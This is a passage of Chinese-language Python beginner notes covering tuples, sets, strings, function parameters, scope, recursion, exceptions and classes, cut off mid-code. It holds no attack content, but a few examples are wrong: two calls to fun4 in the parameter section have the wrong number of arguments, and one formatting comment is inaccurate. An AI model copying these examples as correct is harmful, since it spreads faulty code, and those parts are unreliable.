100\t\t#元组不允许修改元素\n\n#由于[20,30]是列表，而列表是可变序列，所以可以向列中添加元素，而列表的内存地址不变\nt[1].append(100)\nprint(t, id(t[1]))\n'''\n(10, [20, 30], 9)\n<class 'tuple'>\n10 <class 'int'> 140736278463024\n[20, 30] <class 'list'> 2507573096776\n9 <class 'int'> 140736278462992\n140736278465904\n(10, [20, 30, 100], 9) 2507573096776\n'''\n```\n\n## 11.1 元组的创建方式\n\n```python\nt = ('python', 'hello', 90)\nprint(t, type(t))\nt2 = 'python', 'hello', 90\nprint(t2, type(t2))\n\n#如果元组中只有一个元素，需要使用逗号和小括号\nt3 = ('python',)\nprint(t3, type(t3))\n\nt1 = tuple(('python', 'hello', 90))\nprint(t1)\n\nt4 = ()\nt5 = tuple()\nprint(t4, t5)\n'''\n('python', 'hello', 90) <class 'tuple'>\n('python', 'hello', 90) <class 'tuple'>\n('python',) <class 'tuple'>\n('python', 'hello', 90)\n() ()\n'''\n```\n\n## 11.2 元组的遍历\n\n```python\nt = ('python', 'hello', 90)\nprint(t[0])\nfor i in t:\n    print(i)\n'''\npython\npython\nhello\n90\n'''\n```\n\n# 12. 集合\n\n集合与列表、字典一样都属于可变类型的序列，集合是没有的value的字典。\n\n## 12.1 集合的创建\n\n```python\n#集合中的元素不允许重复，集合中的元素是无序的\ns = {2,3,4,5,5,6,7,7}\nprint(s)\n\ns1 = set(range(6))\nprint(s1, type(s1))\n\n#将列表转化为集合中\nprint(set([1,2,4,5,5,6,6]))\n\n#将元组转化为集合\nprint(set((3,4,43,541)))\n\n#将字符串转化为集合\nprint(set('python'))\n\n#将集合转化为集合\nprint(set({124,2,3,5}))\n\n#定义空集合\ns2 = set()\nprint(s2)\n'''\n{2, 3, 4, 5, 6, 7}\n{0, 1, 2, 3, 4, 5} <class 'set'>\n{1, 2, 4, 5, 6}\n{43, 3, 4, 541}\n{'h', 'o', 'p', 't', 'n', 'y'}\n{2, 3, 124, 5}\nset()\n'''\n```\n\n## 12.2 集合的增删改\n\n```python\n#集合元素的判断\ns = {10,20,30,405,50}\nprint(10 in s)\nprint(10 not in s)\n\n#集合元素的新增操作\ns.add(200)\t#一次添加一个元素\nprint(s)\ns.update({200,300,400})\t#一次至少添加一个元素\nprint(s)\ns.update([75,60])\nprint(s)\ns.update((78,22))\nprint(s)\n'''\nTrue\nFalse\n{200, 10, 50, 20, 405, 30}\n{200, 10, 300, 400, 50, 20, 405, 30}\n{200, 10, 75, 300, 400, 50, 20, 405, 60, 30}\n{200, 10, 75, 300, 78, 400, 50, 20, 405, 22, 60, 30}\n'''\n```\n\n```python\n#集合元素的删除\ns = {10,20,30,405,50}\ns.remove(30)\n#s.remove(500)\t#抛出异常\nprint(s)\n\n#不抛出异常\ns.discard(500)\ns.discard(10)\nprint(s)\n\n#随机删除一个元素\ns.pop()\n#s.pop(50)\t#不能指定参数\nprint(s)\n\ns.clear()\nprint(s)\n'''\n{10, 50, 20, 405}\n{50, 20, 405}\n{20, 405}\nset()\n'''\n```\n\n## 12.3 集合间的关系\n\n```python\n#判断两个集合是否相等\ns = {10,20,30,40}\ns2 = {30,40,20,10}\nprint(s == s2)\nprint(s != s2)\n\n#判断是否为子集\ns1 = {10,20,30,40,50,60}\ns2 = {10,20,30,40}\ns3 = {10,20,90}\ns4 = {10,20,90}\nprint(s2.issubset(s1))\nprint(s3.issubset(s1))\nprint(s4.issubset(s3))\n\n#判断是否为父集\nprint(s1.issuperset(s2))\nprint(s1.issuperset(s3))\nprint(s4.issuperset(s3))\n\n#是否没有交集\nprint(s2.isdisjoint(s3))\ns4 = {100,200,300}\nprint(s4.isdisjoint(s3))\n'''\nTrue\nFalse\nTrue\nFalse\nTrue\nTrue\nFalse\nTrue\nFalse\nTrue\n'''\n```\n\n## 12.4 集合的数学操作\n\n```python\n#交集\ns1 = {10,20,30,40}\ns2 = {20,30,40,50,60}\nprint(s1.intersection(s2))\nprint(s1 & s2)\t#intersection()与&等价，交集操作\nprint(s1, s2)\n\n#并集\nprint(s1.union(s2))\nprint(s1 | s2)\nprint(s1, s2)\n\n#差集\nprint(s1.difference(s2))\nprint(s1 - s2)\nprint(s1, s2)\n\n#对称差集\nprint(s1.symmetric_difference(s2))\nprint(s1 ^ s2)\nprint(s1, s2)\n'''\n{40, 20, 30}\n{40, 20, 30}\n{40, 10, 20, 30} {40, 50, 20, 60, 30}\n{40, 10, 50, 20, 60, 30}\n{40, 10, 50, 20, 60, 30}\n{40, 10, 20, 30} {40, 50, 20, 60, 30}\n{10}\n{10}\n{40, 10, 20, 30} {40, 50, 20, 60, 30}\n{50, 10, 60}\n{50, 10, 60}\n{40, 10, 20, 30} {40, 50, 20, 60, 30}\n'''\n```\n\n## 12.5 集合生成式\n\n用于生成集合的公式。\n\n```python\n#列表生成式\nlst = [i*i for i in range(10)]\nprint(lst)\n\n#集合生成式\ns = {i*i for i in range(10)}\nprint(s)\n'''\n[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]\n{0, 1, 64, 4, 36, 9, 16, 49, 81, 25}\n'''\n```\n\n# 13. 列表、字典、元组、集合总结\n\n| 数据结构    | 是否可变 | 是否重复                 | 是否有序 | 定义符号    |\n| ----------- | -------- | ------------------------ | -------- | ----------- |\n| 列表(list)  | 可变     | 可重复                   | 有序     | []          |\n| 元组(tuple) | 不可变   | 可重复                   | 有序     | ()          |\n| 字典(dict)  | 可变     | key不可重复，value可重复 | 无序     | {key:value} |\n| 集合(set)   | 可变     | 不可重复                 | 无序     | {}          |\n\n# 14. 字符串\n\n## 14.1 字符串的创建与驻留机制\n\n驻留机制的几种情况：\n\n- 字符串的长度为0或1时\n- 符合标识符的字符串\n- 字符串只在编译时进行驻留，而非运行时\n- [-5,256]之间的整数数字\n\n```python\na = 'v5le0n9'\nb = \"v5le0n9\"\nc = '''v5le0n9'''\nprint(a, id(a))\nprint(b, id(b))\nprint(c, id(c))\n\na = 'abc%'\nb = 'abc%'\nprint(id(a), id(b))#在交互式窗口不同，在VS相同\n\na = '%'\nb = '%'\nprint(id(a), id(b))\n\na = 'abc'\nb = 'ab' + 'c'\nc = ''.join(['ab','c'])\nprint(a, id(a), type(a))\nprint(b, id(b), type(b))\nprint(c, id(c), type(c))\n'''\nv5le0n9 1860778217520\nv5le0n9 1860778217520\nv5le0n9 1860778217520\n1860778217968 1860778217968\n1860707424368 1860707424368\nabc 2658633804016 <class 'str'>\nabc 2658633804016 <class 'str'>\nabc 2658669390576 <class 'str'>\n'''\n```\n\n## 14.2 字符串的常用操作\n\n### 14.2.1 字符串的查询\n\n| 功能 | 方法名称 | 作用                                                         |\n| ---- | -------- | ------------------------------------------------------------ |\n| 查询 | index()  | 查找子串substr第一次出现的位置，如果查找的子串不存在时，则抛出ValueError |\n|      | rindex() | 查找子串substr最后一次出现的位置，如果查找的子串不存在时，则抛出ValueError |\n|      | find()   | 查找子串substr第一次出现的位置，如果查找的子串不存在时，则返回-1 |\n|      | rfind()  | 查找子串substr最后一次出现的位置，如果查找的子串不存在时，则返回-1 |\n\n```python\ns = 'hello,hello'\nprint(s.index('lo'))\nprint(s.rindex('lo'))\nprint(s.find('lo'))\nprint(s.rfind('lo'))\n'''\n3\n9\n3\n9\n'''\n```\n\n### 14.2.2 字符串大小写转换\n\n```python\ns = 'hello python'\na = s.upper()\nprint(s,id(s))\nprint(a,id(a))\nprint(a.lower(),id(a.lower()))\n'''\nhello python 1765330538608\nHELLO PYTHON 1765267539440\nhello python 1765330535920\n'''\n```\n\n```python\ns2 = 'hello V5LE0N9'\nprint(s2.swapcase())\nprint(s2.title())\nprint(s2.capitalize())\n'''\nHELLO v5le0n9\nHello V5Le0N9\nHello v5le0n9\n'''\n```\n\n### 14.2.3 字符串的对齐\n\n| 功能       | 方法名称 | 作用                                                         |\n| ---------- | -------- | ------------------------------------------------------------ |\n| 字符串对齐 | center() | 居中对齐，第一个参数指定宽度，第二个参数指定填充符，第二个参数可选，默认空格，如果设置宽度小于实际宽度则返回原字符串 |\n|            | ljust()  | 左对齐，第一个参数指定宽度，第二个参数指定填充符，第二个参数可选，默认空格，如果设置宽度小于实际宽度则返回原字符串 |\n|            | rjust()  | 右对齐，第一个参数指定宽度，第二个参数指定填充符，第二个参数可选，默认空格，如果设置宽度小于实际宽度则返回原字符串 |\n|            | zfill()  | 右对齐，左边用0填充，该方法只接收一个参数，用于指定字符串的宽度，如果指定的宽度小于等于字符串长度，则返回字符串本身 |\n\n```python\ns = 'hello v5le0n9'\nprint(s.center(20,'*'))\nprint(s.ljust(20,'*'))\nprint(s.rjust(20,'*'))\nprint(s.zfill(20))\n'''\n***hello v5le0n9****\nhello v5le0n9*******\n*******hello v5le0n9\n0000000hello v5le0n9\n'''\n```\n\n### 14.2.4 字符串的劈分\n\n| 功能         | 方法名称 | 作用                                                         |\n| ------------ | -------- | ------------------------------------------------------------ |\n| 字符串的劈分 | split()  | 从字符串的左边开始劈分，默认的劈分字符是空格，返回值是一个列表。以通过参数sep指定劈分字符串是劈分符。通过参数maxsplit指定劈分字符串时的最大劈分次数，在经过最大次劈分后，剩余的子串会单独作为一部分。 |\n|              | rsplit() | 从字符串的右边开始劈分，默认的劈分字符是空格，返回值是一个列表。通过参数maxsplit指定劈分字符串时的最大劈分次数，在经过最大次劈分后，剩余的子串会单独作为一部分。 |\n\n```python\ns = 'hello v5le0n9 hhhh'\nlst = s.split()\nprint(lst)\n\nsl = 'hello|v5le0n9|hhh'\nprint(sl.split(sep='|'))\nprint(sl.split(sep='|',maxsplit=1))\n\ns = 'hello v5le0n9 hhhh'\nlst = s.rsplit()\nprint(lst)\nsl = 'hello|v5le0n9|hhh'\nprint(sl.rsplit(sep='|'))\nprint(sl.rsplit(sep='|',maxsplit=1))\n'''\n['hello', 'v5le0n9', 'hhhh']\n['hello', 'v5le0n9', 'hhh']\n['hello', 'v5le0n9|hhh']\n['hello', 'v5le0n9', 'hhhh']\n['hello', 'v5le0n9', 'hhh']\n['hello|v5le0n9', 'hhh']\n'''\n```\n\n### 14.2.5 字符串的判断\n\n| 功能             | 方法名称       | 作用                                                         |\n| ---------------- | -------------- | ------------------------------------------------------------ |\n| 判断字符串的方法 | isidentifier() | 判断指定的字符串是否为合法的标识符                           |\n|                  | isspace()      | 判断指定的字符串是否全部由空白字符组成(回车、换行、水平制表符等) |\n|                  | isalpha()      | 判断指定的字符串是否全部由字母组成                           |\n|                  | isdecimal()    | 判断指定的字符串是否全部由十进制数字组成                     |\n|                  | isnumeric()    | 判断指定的字符串是否全部由数字组成                           |\n|                  | isalnum()      | 判断指定的字符串是否全部由字母和数字组成                     |\n\n```python\ns = 'hello v5le0n9'\nprint(s.isidentifier())\t\t\t#False\nprint('hello'.isidentifier())\t#True\nprint('张三'.isidentifier())\t\t#True\nprint('\\t'.isspace())\t\t\t#True\nprint('abc'.isalpha())\t\t\t#True\nprint('张三'.isalpha())\t\t\t#True\nprint('123'.isdecimal())\t\t#True\nprint('123四'.isdecimal())\t\t#False\nprint('123'.isnumeric())\t\t#True\nprint('123四'.isnumeric())\t\t#True\nprint('abc1'.isalnum())\t\t\t#True\n```\n\n### 14.2.6 替换与合并\n\n| 功能         | 方法名称  | 作用                                                         |\n| ------------ | --------- | ------------------------------------------------------------ |\n| 字符串替换   | replace() | 第一个参数指定被替换的子串，第二个参数指定替换子串的字符串，该方法返回替换后得到的字符串，替换前的字符串不发生变化，调用该方法时可以通过第三个参数指定最大替换次数 |\n| 字符串的合并 | join()    | 将列表或元组中的字符串合并成一个字符串                       |\n\n```python\ns = 'hello v5le0n9'\nprint(s.replace('v5le0n9','Java'))\ns1 = 'hello hei ha hu hu hu'\nprint(s1.replace('hu','hello',2))\n\nlst = ['hello', 'java', 'python']\nprint('|'.join(lst))\nprint(' '.join(lst))\n\nt = ('hello', 'java', 'python')\nprint(''.join(t))\nprint('*'.join('python'))\n'''\nhello Java\nhello hei ha hello hello hu\nhello|java|python\nhello java python\nhellojavapython\np*y*t*h*o*n\n'''\n```\n\n## 14.3 字符串的比较\n\n比较规则：首先比较两个字符串中的第一个字符，如果相等则继续比较下一个字符，依次比较下去，直到两个字符串中的字符不相等时，其比较结果就是两个字符串的比较结果，两个字符串中的所有后续字符将不再被比较。\n\n比较原理：liang\n\n```python\nprint('apple' > 'app')\t#True\nprint('apple' > 'banana')\t#False，相当于97 > 98\nprint(ord('a'),ord('b'))\t#97 98\nprint(ord('梁'))\t\t\t\t#26753\n\n'''\n== 比较的是value\nis 比较的是id是否相等\n'''\na = b = 'python'\nc = 'python'\nprint(a == b)\nprint(a == c)\nprint(a is b)\nprint(a is c)\n'''\nTrue\nTrue\nTrue\nTrue\n'''\n```\n\n## 14.4 字符串的切片\n\n```python\ns = 'hello v5le0n9'\ns1 = s[:5]\ns2 = s[6:]\ns3 = '!'\nnewstr = s1 + s3 +s2\nprint(s1)\nprint(s2)\nprint(newstr)\nprint(s[6:10:2])\nprint(s[::-1])\nprint(s[-7::1])\n'''\nhello\nv5le0n9\nhello!v5le0n9\nvl\n9n0el5v olleh\nv5le0n9\n'''\n```\n\n## 14.5 格式化字符串\n\n```python\nname = '张三'\nage = 20\nprint('我叫%s，今年%d岁' % (name, age))\nprint('我叫{0}，今年{1}岁'.format(name, age))\nprint(f'我叫{name}，今年{age}岁')\n'''\n我叫张三，今年20岁\n我叫张三，今年20岁\n我叫张三，今年20岁\n'''\n```\n\n```python\nprint('%10d' % 99)\t#10表示宽度\nprint('hellohello')\t\nprint('%.3f' % 3.1415926)\t#.3表示小数点后3位\nprint('%10.3f' % 3.1415926)\n'''\n        99\nhellohello\n3.142\n     3.142\n'''\n```\n\n```python\nprint('{0}'.format(3.1415926))\nprint('{0:.3}'.format(3.1415926))\t#一共3位数\nprint('{0:.3f}'.format(3.1415926))\t#3f表三位小数\nprint('{0:10.3}'.format(3.1415926))\t#同时设置宽度和精度，一共10位，其中3位是小数\n'''\n3.1415926\n3.14\n3.142\n      3.14\n'''\n```\n\n## 14.6 字符串的编码转换\n\n编码：将字符串转换为二进制数据(bytes)\n\n解码：将bytes类型的数据转换成字符串类型\n\n```python\ns = \"天涯共此时\"\n\n#编码\nprint(s.encode(encoding = 'GBK'))\t#GBK一个中文占两个字节\nprint(s.encode(encoding = 'UTF-8'))#UTF8一个中文占三个字节\n\n#解码\nbyte = s.encode(encoding = 'GBK')\nprint(byte.decode(encoding = 'GBK'))\nbyte = s.encode(encoding = 'UTF-8')\nprint(byte.decode(encoding = 'UTF-8'))\n'''\nb'\\xcc\\xec\\xd1\\xc4\\xb9\\xb2\\xb4\\xcb\\xca\\xb1'\nb'\\xe5\\xa4\\xa9\\xe6\\xb6\\xaf\\xe5\\x85\\xb1\\xe6\\xad\\xa4\\xe6\\x97\\xb6'\n天涯共此时\n天涯共此时\n'''\n```\n\n# 15. 函数\n\n函数就是执行特定任务和完成特定功能的一段代码。\n\n为什么需要函数？\n\n- 复用代码\n- 隐藏实现细节\n- 提高可维护性\n- 提高可读性便于调试\n\n## 15.1 函数的创建与调用\n\n```python\ndef calc(a, b):\n    c = a + b\n    return c\nresult = calc(10, 20)\nprint(result)\n'''\n30\n'''\n```\n\n## 15.2 函数的参数传递\n\n```python\ndef calc(a, b):\t#a,b为形参\n    c = a + b\n    return c\nresult = calc(10, 20)\t#10，20为实参\nprint(result)\nresult = (calc(b=10, a=20))\t#等号左侧为关键字参数\n```\n\n```python\ndef fun(arg1, arg2):\n    print('arg1 = ', arg1)\n    print('arg2 = ', arg2)\n    arg1 = 100\n    arg2.append(10)\n    print('arg1 = ', arg1)\n    print('arg2 = ', arg2)\nn1 = 11\nn2 = [22,33,44]\nprint(n1)\nprint(n2)\nfun(n1,n2)\nprint(n1)\nprint(n2)\n'''\n11\n[22, 33, 44]\narg1 =  11\narg2 =  [22, 33, 44]\narg1 =  100\narg2 =  [22, 33, 44, 10]\n11\n[22, 33, 44, 10]\n'''\n```\n\n## 15.3 函数的返回值\n\n如果函数没有返回值，return可以省略不写。\n\n函数的返回值，如果是1个，直接返回类型。\n\n函数的返回值，如果是多个，返回的结果为元组。\n\n```python\ndef fun(num):\n    odd = []\n    even = []\n    for i in num:\n        if i % 2:\n            odd.append(i)\n        else:\n            even.append(i)\n    return odd, even\nprint(fun([10,29,34,23,44,53,55]))\n'''\n([29, 23, 53, 55], [10, 34, 44])\n'''\n```\n\n## 15.4 函数的参数定义\n\n### 15.4.1 默认值参数\n\n函数定义是，给形参设置默认值，只有与默认值不符的时候才需要传递实参。\n\n```python\ndef fun(a, b=10):\n    print(a, b)\n    \nfun(100)\t\t#只传一个参数，b采用默认值\nfun(20,30)\t\t#30将默认值10替换\n```\n\n### 15.4.2 个数可变的位置参数\n\n定义函数时，可能无法事先确定传递的位置实参的个数时，使用可变的位置参数。使用`*`定义个数可变的位置形参，结果为一个元组。\n\n```python\ndef fun(*args):\n    print(args)\n    print(args[0])\nfun(10)\nfun(10,20)\nfun(10,20,30)\n'''\n(10,)\n10\n(10, 20)\n10\n(10, 20, 30)\n10\n'''\n```\n\n```python\ndef fun2(*args,*a):\n    pass\n#以上代码程序报错，可变位置参数只能是一个\n```\n\n### 15.4.3 个数可变的关键字形参\n\n定义函数时，无法事先确定传递的关键字实参的个数时，使用可变的关键字形参。使用`**`定义个数可变的关键字形参，结果为一个字典。\n\n```python\ndef fun(**args):\n\tprint(args)\nfun(a = 10)\nfun(a=10, b=20, c=30)\n```\n\n```python\ndef fun2(**args,**a):\n    pass\n#以上代码程序报错，可变关键字参数只能是一个\n```\n\n```python\ndef fun3(*args1,**args2):\n    pass\n#既有可变位置参数又有可变关键字参数，要求可变位置参数放在可变关键字参数之前\n```\n\n## 15.5 函数的参数总结\n\n| 参数的类型                             | 函数的定义 | 函数的调用 | 备注   |\n| -------------------------------------- | ---------- | ---------- | ------ |\n| 位置实参                               |            | √          |        |\n| 将序列中的每个元素都转换为位置实参     |            | √          | 使用*  |\n| 关键字实参                             |            | √          |        |\n| 将字典中的每个键值对都转换为关键字实参 |            | √          | 使用** |\n| 默认值形参                             | √          |            |        |\n| 关键字形参                             | √          |            | 使用*  |\n| 个数可变的位置形参                     | √          |            | 使用*  |\n| 个数可变的关键字形参                   | √          |            | 使用** |\n\n```python\ndef fun(a,b,c):\t#形参\n    print('a = ', a)\n    print('b = ', b)\n    print('c = ', c)\nfun(10,20,30)\t#位置实参\nlst = [11,22,33]\nfun(*lst)\t\t#将列表中的每个元素都转换为位置实参传入\nfun(a=100, c=300, b=200)\t#关键字实参\ndic = {'a':111, 'b':222, 'c':333}\nfun(**dic)\t\t#在函数调用时，将字典中的键值对都转换为关键字实参传入\n```\n\n```python\ndef fun(a, b=10):\t#默认值形参\n    print('a = ', a)\n    print('b = ', b)\n\ndef fun2(*args):\t#个数可变的位置形参\n    print(args)\n\ndef fun3(**args2):\t#个数可变的关键字形参\n    print(args2)\n    \nfun2(10,20,30,40)\nfun3(a=11,b=22,c=33)\n\ndef fun4(a,b,c,d):\n    print('a = ', a)\n    print('b = ', b)\n    print('c = ', c)\n    print('d = ', d)\n\nfun4(10,20,30,40,50)\t#位置实参\nfun4(a=10,b=20,c=30)\t#关键字实参\nfun4(10,20,d=30,c=40)\n\n#c,d只能采用关键字实参传递\ndef fun5(a,b,*,c,d):\t#从*之后，只能采用关键字参数传递\n    pass\n```\n\n# 16. 变量的作用域\n\n变量的作用域：程序代码能访问该变量的区域。根据变量的有效范围可分为局部变量和全局变量。\n\n局部变量：在函数内定义并使用的变量，只在函数内部有效，局部变量使用global声明，这个变量就会变成全局变量。\n\n全局变量：函数体外定义的变量，可作用于函数内外。\n\n```python\ndef fun(a,b):\n    c = a + b\n    print(c)\n\nname = 'v5le0n9'\t#全局变量\nprint(name)\ndef fun2():\n    print(name)\nfun2()\n\ndef fun3():\n    global age\t\t#全局变量\n    age = 20\n    print(age)\nfun3()\nprint(age)\n'''\nv5le0n9\nv5le0n9\n20\n20\n'''\n```\n\n# 17. 递归函数\n\n在一个函数的函数体内调用该函数本身。\n\n```python\ndef fac(n):\n    if n==1:\n        return 1\n    else:\n        return n*fac(n-1)\nprint(fac(6))\n```\n\n```python\n#斐波那契数列\ndef fib(n):\n    if n==1:\n        return 1\n    elif n==2:\n        return 1\n    else:\n        return fib(n-1)+fib(n-2)\nprint(fib(6))\n\nfor i in range(1,7):\n    print(fib(i), end='\\t')\n'''\n8\n1       1       2       3       5       8\n'''\n```\n\n# 18. Python的异常处理机制\n\n## 18.1 try...except\n\n```python\ntry:\n    a = int(input(\"请输入第一个整数：\"))\n    b = int(input(\"请输入第二个整数：\"))\n    result = a / b\n    print('结果为：', result)\nexcept ZeroDivisionError:\n    print('对不起，除数不允许为0')\nexcept ValueError:\n    print('只能输入数字串')\nprint('程序结束')\n'''\n请输入第一个整数：20\n请输入第二个整数：0\n对不起，除数不允许为0\n程序结束\n'''\n```\n\n## 18.2 try...except...else\n\n如果try块中没有抛出异常，则执行else块，如果try中抛出异常，则执行except块。\n\n```python\ntry:\n    n1 = int(input(\"请输入一个整数：\"))\n    n2 = int(input(\"请输入另一个整数：\"))\n    result = n1 / n2\nexcept BaseException as e:\n    print(\"出错了！\")\n    print(e)\nelse:\n    print(\"结果为：\", result)\n'''\n请输入一个整数：10\n请输入另一个整数：0\n出错了！\ndivision by zero\n'''\n```\n\n## 18.3 try...except...else...finally\n\nfinally块无论是否发生异常都会被执行，能常用来释放try块中申请的资源。\n\n```python\ntry:\n    n1 = int(input(\"请输入一个整数：\"))\n    n2 = int(input(\"请输入另一个整数：\"))\n    result = n1 / n2\nexcept BaseException as e:\n    print(\"出错了！\")\n    print(e)\nelse:\n    print(\"结果为：\", result)\nfinally:\n    print(\"总会被执行的代码\")\nprint(\"程序结束\")\n'''\n请输入一个整数：a\n出错了！\ninvalid literal for int() with base 10: 'a'\n总会被执行的代码\n程序结束\n'''\n```\n\n## 18.4 常见的异常类型\n\n| 异常类型          | 描述              |\n| ----------------- | ----------------- |\n| ZeroDivisionError | 除零错误          |\n| IndexError        | 序列中没有此索引  |\n| KeyError          | 映射中没有这个键  |\n| NameError         | 未声明/初始化对象 |\n| SyntaxError       | Python语法错误    |\n| ValueError        | 传入无效参数      |\n\n## 18.5 traceback模块\n\n```python\nimport traceback\ntry:\n    print(1 / 0)\nexcept:\n    traceback.print_exc()\n'''\nTraceback (most recent call last):\n  File \"E:\\pythonproject\\PythonApplication1\\PythonApplication1\\module2.py\", line 3, in <module>\n    print(1 / 0)\nZeroDivisionError: division by zero\n'''\n```\n\n# 19. 类与对象\n\n## 19.1 类的创建\n\n```python\nclass Student:\t#类名有一个或多个单词组成，每个单词首字母大写\n    pass\nprint(id(Student))\nprint(type(Student))\nprint(Student)\n'''\n2519221836392\n<class 'type'>\n<class '__main__.Student'>\n'''\n```\n\n```python\nclass Student:\n    native_pace = \"广东\"\t\t#属性\n    \n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n        \n    #实例方法\n    def eat(self):\t\t\t\n        print(\"学生在吃饭\")\n    \n    #静态方法\n    @staticmethod\n    def menthod():\t\t\t#静态方法不允许写self符号\n        print(\"静态方法\")\n        \n    #类方法\n    @classmethod\n    def cm(cls):\n        print(\"类方法\")\n        \n#在类之外定义的称为函数，在类内部定义的称为方法\ndef drink():\t\t\t#函数\n    print(\"喝水\")\n    \n#创建Student对象的实例对象\nstu1 = Student('张三', 20)\nprint(id(stu1))\nprint(type(stu1))\nprint(stu1)\nstu1.eat()\nprint(stu1.age)\nStudent.eat(stu1)\t\t#33行与31行代码相同\n'''\n2611936977032\n<class '__main__.Student'>\n<__main__.Student object at 0x0000026023936088>\n学生在吃饭\n20\n学生在吃饭\n'''\n```\n\n## 19.2 类属性、类方法、静态方法\n\n类属性：类中方法外的变量称为类属性，被该类的所有对象共享\n\n类方法：使用@classmethod 修饰的方法，使用类名直接访问的方法\n\n静态方法：使用@staticmethod 修饰的方法，使用类名直接访问的方法\n\n```python\nclass Student:\n    native_pace = \"广东\"\t\t#属性\n    \n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n        \n    #实例方法\n    def eat(self):\t\t\t\n        print(\"学生在吃饭\")\n    \n    #静态方法\n    @staticmethod\n    def method():\t\t\t#静态方法不允许写self符号\n        print(\"静态方法\")\n        \n    #类方法\n    @classmethod\n    def cm(cls):\n        print(\"类方法\")\n            \nprint(Student.native_pace)\nstu1 = Student('张三',20)\nstu2 = Student('李四',30)\nprint(stu1.native_pace)\nprint(stu2.native_pace)\nStudent.native_pace = \"天津\"\nprint(stu1.native_pace)\nprint(stu2.native_pace)\nStudent.cm()\nStudent.method()\n'''\n广东\n广东\n广东\n天津\n天津\n类方法\n静态方法\n'''\n```\n\n## 19.3 动态绑定属性和方法\n\n```python\nclass Student:  \n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n        \n    def eat(self):\t\t\t\n        print(self.name + \"在吃饭\")\nstu1 = Student(\"张三\", 20)\nstu1.eat()\nstu2 = Student(\"李四\", 30)\nstu2.eat()\n\n#绑定属性\nstu2.gender = '女'\nprint(stu2.name, stu2.age, stu2.gender)\n\n#绑定方法\ndef show():\n    print(\"定义在类之外\")\nstu1.show = show\nstu1.show()\n'''\n张三在吃饭\n李四在吃饭\n李四 30 女\n定义在类之外\n'''\n```\n\n## 19.4 封装\n\n面向对象的三大特征：\n\n- 封装：提高程序的安全性\n- 继承：提高代码的复用性\n- 多态：提高程序的可扩展性和可维护性\n\n```python\nclass Car:\n    def __init__(self,brand):\n        self.brand = brand\n    def start(self):\n        print(\"汽车已启动...\")\ncar = Car('宝马x5')\ncar.start()\nprint(car.brand)\n```\n\n```python\nclass Student:\n    def __init__(self, name, age):\n        self.name = name\n        self.__age = age\t#属性私有\n    def show(self):\n        print(self.name, self.__age)\nstu = Student(\"张三\", 20)\nstu.show()\t\t\t#张三 20\nprint(stu.name)\t\t#张三\n#print(stu.__age)\t#不能在类外部使用\nprint(dir(stu))\n#['_Student__age', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'name', 'show']\nprint(stu._Student__age)\t#20，可以通过'_Student__age'访问\n```\n\n## 19.5 继承\n\n如果一个类没有继承任何类，则默认继承object。python支持多继承，定义子类时，必须在其构造函数中调用父类的构造函数。\n\n```python\n#定义父类\nclass Person(object):\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n    def info(self):\n        print('姓名:{0}，年龄:{1}'.format(self.name,self.age))\n\n#定义子类 \nclass Student(Person):\n    def __init__(self, name, age, score):\n        super().__init__(name, age)\n        self.score = score\nstu = Student('Jack', 20, '1001')\nstu.info()\n'''\n姓名:Jack，年龄:20\n'''\n```\n\n```python\n#多继承\nclass A(object):\n    pass\nclass B(object):\n    pass\nclass C(A,B):\n    pass\n```\n\n### 19.5.1 方法重写\n\n```python\n#定义父类\nclass Person(object):\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n    def info(self):\n        print('姓名:{0}，年龄:{1}'.format(self.name,self.age))\n\n#定义子类 \nclass Student(Person):\n    def __init__(self, name, age, score):\n        super().__init__(name, age)\n        self.score = score\n    def info(self):\n        super().info()\n        print(self.score)\nstu = Student('Jack', 20, '1001')\nstu.info()\n'''\n姓名:Jack，年龄:20\n1001\n'''\n```\n\n### 19.5.2 object类\n\nobject类是所有类的父类，因此所有类都有object类的属性和方法。\n\n内置函数dir()可以查看指定对象所有属性。\n\nobject有一个\\_\\_str\\_\\_()方法，用于返回一个对于“对象的描述”，对应于内置函数str()经常用于print()方法，帮我们查看对象的信息，所以我们经常会对\\_\\_str\\_\\_()进行重写。\n\n```python\nclass Student:\n    pass\nstu = Student()\nprint(dir(stu))\nprint(stu)\n'''\n['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']\n<__main__.Student object at 0x00000297B7A94788>\n'''\n```\n\n```python\nclass Student:\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n    def __str__(self):\n        return '我的名字是{0}，今年{1}岁'.format(self.name,self.age)\nstu = Student('张三', 20)\nprint(dir(stu))\nprint(stu)\t\t\t#默认调用__str__()方法\nprint(type(stu))\n'''\n['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name']\n我的名字是张三，今年20岁\n<class '__main__.Student'>\n'''\n```\n\n## 19.6 多态\n\n静态语言实现多态的三个必要条件，比如Java：\n\n1. 继承\n2. 方法重写\n3. 父类引用指向子类对象\n\n动态语言(Python)的多态崇尚“鸭子类型”，当看到一只鸟走起来像鸭子、游起来像鸭子、叫起来像鸭子，那么这只鸟就可以被称为鸭子。在鸭子类型中，不需要关心对象是什么类型，到底是不是鸭子，只关心对象的行为。\n\n```python\nclass Animal(object):\n    def eat(self):\n        print(\"动物会吃\")\nclass Dog(Animal):\n    def eat(self):\n        print(\"狗吃骨头\")\nclass Cat(Animal):\n    def eat(self):\n        print(\"猫吃鱼\")\nclass Person:\n    def eat(self):\n        print(\"人吃五谷杂粮\")\n\ndef fun(obj):\n    